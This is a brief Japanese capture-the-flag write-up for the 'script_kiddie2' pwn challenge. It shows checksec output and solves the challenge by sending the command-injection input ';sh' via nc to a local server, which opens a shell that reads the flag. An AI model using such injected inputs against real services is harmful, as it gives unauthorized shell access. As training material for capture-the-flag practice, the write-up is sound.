## 事前知識
script_kiddieのwriteupを参照してください。

### checksec

```bash
$ checksec script_kiddie2
[*] '/home/user/work/taskctf21-public/pwn/script_kiddie/dist/script_kiddie2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## 方針
- OSコマンドインジェクションをやる
- 短くできる方法を考える

## 解法
サーバの起動

```bash
docker-compose up -d
```

```bash
(echo ";sh"; cat) | nc 127.0.0.1 30007
Which flag do you want?
ls
flag
script_kiddie2
start.sh
cat flag
taskctf{sh_1s_als0_0k}^C
```

## コメント
script_kiddieのレビューをしていた時にうまれた問題です。想定解は「;sh」です。
